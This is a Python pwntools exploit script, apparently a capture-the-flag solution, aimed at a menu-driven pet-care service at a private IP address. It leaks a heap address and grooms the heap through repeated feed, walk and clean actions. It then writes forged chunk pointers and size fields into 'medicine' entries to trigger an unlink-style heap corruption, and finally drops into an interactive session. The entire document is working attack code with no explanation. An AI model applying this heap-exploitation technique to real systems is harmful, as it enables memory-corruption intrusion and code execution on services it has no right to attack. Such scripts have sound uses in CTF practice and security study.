from pwn import *

s = remote('192.168.33.10',1234)
s.recvuntil('>>')
s.send('A'*0xa)

def adopt_animal(_type, _name):
  s.recvuntil('>>')
  s.sendline('1')
  s.recvuntil('>>')
  s.sendline(str(_type))
  s.recvuntil('>>')
  s.send(_name)

def feed_animal(_name):
  s.recvuntil('>>')
  s.sendline('2')
  s.recvuntil('>>')
  s.send(_name)

def walk_with(_name):
  s.recvuntil('>>')
  s.sendline('4')
  s.recvuntil('>>')
  s.send(_name)

def hospital_animal(_name):
  s.recvuntil('>>')
  s.sendline('5')
  s.recvuntil('>>')
  s.send(_name)

def make_medicine(_name, m_name, m_desc):
  s.recvuntil('>>')
  s.sendline('2')
  s.recvuntil('>>')
  s.send(_name)
  s.recvuntil('>>')
  s.send(m_name)
  s.recvuntil('>>')
  s.send(m_desc)

def clean_dong(_name):  
  s.recvuntil('>>')
  s.sendline('3')
  s.recvuntil('>>')
  s.send(_name)

raw_input()
adopt_animal(1,"A"*0x14)
feed_animal("A"*0x14)
heap = u64(s.recvuntil('ate')[-10:-4]+'\x00\x00') - 0x8c0
log.info("HEAP : 0x%x"%heap)

adopt_animal(1,"ABCD\n")

adopt_animal(1,"PWN\n")
for i in xrange(20):
  feed_animal("PWN\n")
for i in xrange(8):
  clean_dong("PWN\n")

for i in xrange(20):
  feed_animal("ABCD\n")
for i in xrange(20):
  walk_with("ABCD\n")

for i in xrange(20):
  feed_animal("ABCD\n")

for i in xrange(20):
  walk_with("ABCD\n")

for i in xrange(11):
  feed_animal("ABCD\n")
hospital_animal("ABCD\n")

for i in xrange(20):
  walk_with("ABCD\n")
walk_with("ABCD\n")
walk_with("ABCD\n")
feed_animal("PWN\n")
adopt_animal(1,"1234\n")
feed_animal("1234\n")
walk_with("PWN\n")
make_medicine("ABCD\n","K"*0x8, "A"*0x78)
for i in xrange(20):
  print i
  walk_with("ABCD\n")

make_medicine("ABCD\n","K"*0x8, "A"*0x78)
make_medicine("ABCD\n",p64(heap+0x278-0x18),p64(heap+0x278-0x10)+"A"*0x60+p64(0x80)+p64(0x90))
make_medicine("ABCD\n","L"*0x8, "A"*0x78)
for i in xrange(4):
  clean_dong("ABCD\n")
raw_input()
clean_dong("ABCD\n")
s.interactive()
